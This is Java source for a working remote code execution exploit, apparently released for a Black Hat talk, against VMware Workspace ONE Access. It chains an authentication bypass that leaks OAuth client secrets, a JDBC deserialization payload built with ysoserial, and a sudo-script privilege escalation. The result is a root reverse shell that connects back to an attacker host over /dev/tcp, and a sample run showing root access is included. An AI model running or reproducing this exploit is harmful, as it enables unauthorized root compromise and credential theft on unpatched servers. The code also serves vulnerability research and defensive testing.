package com.srcincite.exploit;

import com.vmware.licensecheck.LicenseChecker;
import com.vmware.licensecheck.LicenseHandle;
import com.vmware.licensecheck.MyBase64;
import ysoserial.payloads.ObjectPayload.Utils;
import java.io.*;
import java.lang.reflect.Field;
import java.net.HttpURLConnection;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.security.cert.X509Certificate;
import java.util.Hashtable;
import java.util.Random;
import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.CommandLineParser;
import org.apache.commons.cli.DefaultParser;
import org.apache.commons.cli.HelpFormatter;
import org.apache.commons.cli.Option;
import org.apache.commons.cli.Options;
import org.apache.commons.cli.ParseException;
import org.json.JSONObject;

/*
Hekate - A VMWare Workspace ONE Access Remote Code Execution Exploit
Steven Seeley of Qihoo 360 Vulnerability Research Institute
Tekniq: Postgres JDBC Driver

## Details

Date: Mon Jul 4 13:37:00 CST 2022
Version: 21.08.0.1 (latest)
File: identity-manager-21.08.0.1-19010796_OVF10.ova
File SHA1: 69e9fb988522c92e98d2910cc106ba4348d61851

## Notes

This is the updated exploit for Black Hat that removes any attacker callback other than the reverse shell

## Example

```
researcher@mars:~/eclipse-workspace/exploit$ java -cp "libs/*":"target/hekate-0.0.1-SNAPSHOT.jar" com.srcincite.exploit.Poc
   __ __    __        __
  / // /__ / /_____ _/ /____
 / _  / -_)  '_/ _ `/ __/ -_)
/_//_/\__/_/\_\\_,_/\__/\__/

A VMWare Workspace ONE Access RCE Exploit
By Steven Seeley (mr_me) of Qihoo 360 Vulnerability Research Institute

Missing required options: t, c
usage: Poc
 -c,--connectback <arg>   The connectback ip or hostname and port
 -t,--target <arg>        The target ip

researcher@mars:~/eclipse-workspace/exploit$ java -cp "libs/*":"target/hekate-0.0.1-SNAPSHOT.jar" com.srcincite.exploit.Poc -t 192.168.2.97 -c 192.168.2.234
   __ __    __        __
  / // /__ / /_____ _/ /____
 / _  / -_)  '_/ _ `/ __/ -_)
/_//_/\__/_/\_\\_,_/\__/\__/

A VMWare Workspace ONE Access RCE Exploit
By Steven Seeley (mr_me) of Qihoo 360 Vulnerability Research Institute

(+) targeting 192.168.2.97
(+) listening at port 1337
(+) leaked ota token: f5c8ae0b-7b86-3233-a8dd-ff6b08779feb:j2UL6TSQc45RHnb9Y7HqNNH3lVMT9ZU8
(+) leaked client secret: gKX0GX8fUWvlR6Vdsm3DOT7yE82CXTOq
(+) bypassed authentication!
(+) triggering deserialization attack...
(+) connection from 192.168.2.97
(+) pop thy shell!
bash: cannot set terminal process group (2099): Inappropriate ioctl for device
bash: no job control in this shell
id
uid=0(root) gid=0(root) groups=0(root),1000(vami),1004(sshaccess)
uname -a
Linux module5.localdomain 4.19.217-1.ph3 #1-photon SMP Thu Dec 2 02:29:27 UTC 2021 x86_64 GNU/Linux
^C
```
*/

public class Poc 
{
    static{
        TrustManager[] trustAllCerts = new TrustManager[] { new X509TrustManager() {
            public java.security.cert.X509Certificate[] getAcceptedIssuers() { return null; }
            public void checkClientTrusted(X509Certificate[] certs, String authType) { }
            public void checkServerTrusted(X509Certificate[] certs, String authType) { }
        } };
        SSLContext sc = null;
        try {
            sc = SSLContext.getInstance("SSL");
        } catch (NoSuchAlgorithmException e1) {
            e1.printStackTrace();
        }
        try {
            sc.init(null, trustAllCerts, new java.security.SecureRandom());
        } catch (KeyManagementException e) {
            e.printStackTrace();
        }
        HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
        HostnameVerifier allHostsValid = new HostnameVerifier() {
            public boolean verify(String hostname, SSLSession session) { return true; }
        };
        HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);
    }

    public String target;
    public String connectback;

    public Poc(String[] args) {
        CommandLine cmd = setUpArgs(args);
        target = cmd.getOptionValue("target");
        connectback = cmd.getOptionValue("connectback");
    }

    public static CommandLine setUpArgs(String[] args) {
        Options options = new Options();
        Option input = new Option("t", "target", true, "The target ip");
        input.setRequired(true);
        options.addOption(input);
        Option output = new Option("c", "connectback", true, "The connectback ip or hostname and port");
        output.setRequired(true);
        options.addOption(output);
        CommandLineParser parser = new DefaultParser();
        HelpFormatter formatter = new HelpFormatter();
        CommandLine cmd = null;
        try {
            cmd = parser.parse(options, args);
        } catch (ParseException e) {
            System.out.println(e.getMessage());
            formatter.printHelp(Poc.class.getSimpleName(), options);
            System.exit(1);
        }
        return cmd;
    }

    public static String getResponse(HttpURLConnection http) throws Exception {
        StringBuilder response;
        try (BufferedReader in = new BufferedReader(
            new InputStreamReader(http.getInputStream()))) {
            response = new StringBuilder();
            String line;
            while ((line = in.readLine()) != null) {
                response.append(line);
            }
        }
        return response.toString();
    }

    private void triggerJdbc(String jwt, String uri, Object payload) throws Exception {
        LicenseChecker lc = new LicenseChecker(null);
        Field handleField = LicenseChecker.class.getDeclaredField("_handle");
        handleField.setAccessible(true);
        LicenseHandle lh = (LicenseHandle)handleField.get(lc);
        Field htEvalStartField = LicenseHandle.class.getDeclaredField("_htEvalStart");
        htEvalStartField.setAccessible(true);
        Field isDirtyField = LicenseHandle.class.getDeclaredField("_isDirty");
        isDirtyField.setAccessible(true);
        Hashtable<Integer, Object> ht = new Hashtable<Integer, Object>();
        ht.put(1337, payload);
        htEvalStartField.set(lh, ht);
        isDirtyField.set(lh, true);
        handleField.set(lc, lh);
        uri += URLEncoder.encode(URLEncoder.encode(lc.getState(), "UTF-8"), "UTF-8");
        String params = String.format("jdbcUrl=%s&dbUsername=&dbPassword=", uri);
        byte[] pData  = params.getBytes();
        URL url = new URL(String.format("https://%s/SAAS/API/1.0/REST/system/dbCheck", this.target));
        URLConnection con = url.openConnection();
        HttpURLConnection http = (HttpURLConnection)con;
        http.setRequestMethod("POST");
        http.setDoOutput(true);
        con.setRequestProperty("Cookie", String.format("HZN=%s", jwt));
        con.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        con.setRequestProperty("Content-Length", Integer.toString(pData.length));
        con.getOutputStream().write(pData);
        try{
            http.getInputStream();
        } catch (Exception e) {}
    }

    private String getActivationToken() throws Exception {
        URL url = new URL(String.format("https://%s/SAAS/API/1.0/REST/oauth2/generateActivationToken/acs", this.target));
        URLConnection con = url.openConnection();
        HttpURLConnection http = (HttpURLConnection)con;
        http.setRequestMethod("POST");
        http.setDoOutput(true);
        String res = getResponse(http);
        assert res != null : "\r\n(-) getActivationToken returned null, authentication bypass failed!";
        JSONObject atObject = new JSONObject(res);
        return atObject.getString("activationToken");
    }

    private String[] getClientDetails(byte[] at) throws Exception {
        URL url = new URL(String.format("https://%s/SAAS/API/1.0/REST/oauth2/activate", this.target));
        URLConnection con = url.openConnection();
        HttpURLConnection http = (HttpURLConnection)con;
        http.setRequestMethod("POST");
        http.setDoOutput(true);
        con.getOutputStream().write(at);
        String res = getResponse(http);
        assert res != null : "\r\n(-) getClientDetails returned null, authentication bypass failed!";
        JSONObject clientObject = new JSONObject(res);
        String ci = clientObject.getString("client_id");
        String cs = clientObject.getString("client_secret");
        System.out.println(String.format("(+) leaked client secret: %s", cs));
        return new String[] {ci, cs};
    }

    private String getAccessToken(String[] cd) throws Exception {
        String params = String.format("grant_type=client_credentials&client_id=%s&client_secret=%s", cd[0], cd[1]);
        byte[] pData  = params.getBytes();
        URL url = new URL(String.format("https://%s/SAAS/auth/oauthtoken", this.target));
        URLConnection con = url.openConnection();
        HttpURLConnection http = (HttpURLConnection)con;
        http.setRequestMethod("POST");
        http.setDoOutput(true);
        con.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        con.setRequestProperty("Content-Length", Integer.toString(pData.length));
        con.getOutputStream().write(pData);
        String res = getResponse(http);
        assert res != null : "\r\n(-) getAccessToken returned null, authentication bypass failed!";
        return new JSONObject(res).getString("access_token");
    }

    private static void transferStreams(Socket socket) throws IOException, InterruptedException {
        InputStream input1 = System.in;
        final OutputStream output1 = socket.getOutputStream();
        InputStream input2 = socket.getInputStream();
        PrintStream output2 = System.out;
        Thread inputThread = streamTransfer(input1, output1);
        Thread outputThread = streamTransfer(input2, output2);
        inputThread.start();
        outputThread.start();
        inputThread.join();
        socket.shutdownOutput();
        outputThread.join();
    }

    private static Thread streamTransfer(final InputStream in, final OutputStream out) {
        return new Thread()
        {
            @Override
            public void run() {
                try {
                    PrintWriter writer = new PrintWriter(out);
                    BufferedReader reader = new BufferedReader(new InputStreamReader(in));
                    String line;
                    while ((line = reader.readLine()) != null) {
                        if (line.lastIndexOf(27) == -1) {
                            writer.println(line);
                        }
                        writer.flush();
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        };        
    }
   
    private String randomString(int length) {
        String alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        StringBuilder sb = new StringBuilder();
        Random random = new Random();
        for(int i = 0; i < length; i++) {
            int index = random.nextInt(alphabet.length());
            char randomChar = alphabet.charAt(index);
            sb.append(randomChar);
        }
        String randomString = sb.toString();
        return randomString;
    }

    public static void main( String[] args ) throws Exception
    {
        String banner = "   __ __    __        __\n"
        + "  / // /__ / /_____ _/ /____\n"
        + " / _  / -_)  '_/ _ `/ __/ -_)\n"
        + "/_//_/\\__/_/\\_\\\\_,_/\\__/\\__/\n"
        + ""
        + "\r\nA VMWare Workspace ONE Access RCE Exploit\n"
        + "By Steven Seeley (mr_me) of Qihoo 360 Vulnerability Research Institute\r\n";
        System.out.println(banner);
        Poc p = new Poc(args);
        System.out.println(String.format("(+) targeting %s", p.target));

        // our connect back listener
        final int port = 1337;
        new Thread()
        {
            @Override
            public void run() {
                System.err.println("(+) listening at port " + port);
                ServerSocket serverSocket;
                Socket socket = null;
                try {
                    serverSocket = new ServerSocket(port);
                    socket = serverSocket.accept();
                    System.err.println("(+) connection from " + socket.getInetAddress().getHostName());
                    System.out.println("(+) pop thy shell!");
                    transferStreams(socket);
                } catch (IOException e) {
                    e.printStackTrace();
                }catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }.start();

        // CVE-2022-22955
        String at = p.getActivationToken();
        JSONObject otaObject = new JSONObject(new String(MyBase64.decode(at)));
        System.out.println(String.format("(+) leaked ota token: %s", otaObject.getString("ota")));
        String[] clientDetails = p.getClientDetails(at.getBytes());
        String jwt = p.getAccessToken(clientDetails);
        assert jwt != null : "\r\n(-) jwt is null, authentication bypass failed!";
        System.out.println("(+) bypassed authentication!");

        // CVE-2022-22960
        String dir = p.randomString(8);
        String bdr = String.format("/tmp/%s", p.randomString(8));
        String tScript = "/opt/vmware/certproxy/bin/certproxyService.sh";
        String lpe = new StringBuilder()
        .append("cd /tmp\n")
        .append(String.format("sudo /usr/local/horizon/scripts/publishCaCert.hzn %s %s\n", tScript, dir))
        .append(String.format("mkdir %s\n", dir))
        .append(String.format("ln -s %s %s/debugConfig.txt\n", tScript, dir))
        .append(String.format("sudo /usr/local/horizon/scripts/gatherConfig.hzn %s\n", dir))
        .append(String.format("rm -rf %s\n", dir))
        .append(String.format("chmod 755 %s\n", tScript))
        .append(String.format("echo \"mv /etc/ssl/certs/%s %s\" > %s\n", dir, tScript, tScript))
        .append(String.format("echo \"chown root:root %s\" >> %s\n", tScript, tScript))
        .append(String.format("echo \"chmod 640 %s\" >> %s\n", tScript, tScript))
        .append(String.format("echo \"rm %s;bash -i >& /dev/tcp/%s/1337 0>&1\" >> %s\n", bdr, p.connectback, tScript))
        .append(String.format("sudo %s\n", tScript))
        .toString();

        // CVE-2022-22957
        String jdbcUri  = String.format("jdbc:postgresql://%s/saas?", p.randomString(8));
        jdbcUri += "socketFactory=com.vmware.licensecheck.LicenseChecker%26socketFactoryArg=";
        String shell = MyBase64.encode(lpe.getBytes());
        Object payload = Utils.makePayloadObject("CommonsBeanutils1", String.format("sh -c $@|sh . echo echo %s|base64 -d>%s;chmod 755 %s;%s", shell, bdr, bdr, bdr));
        System.out.println("(+) triggering deserialization attack...");
        p.triggerJdbc(jwt, jdbcUri, payload);
    }
}
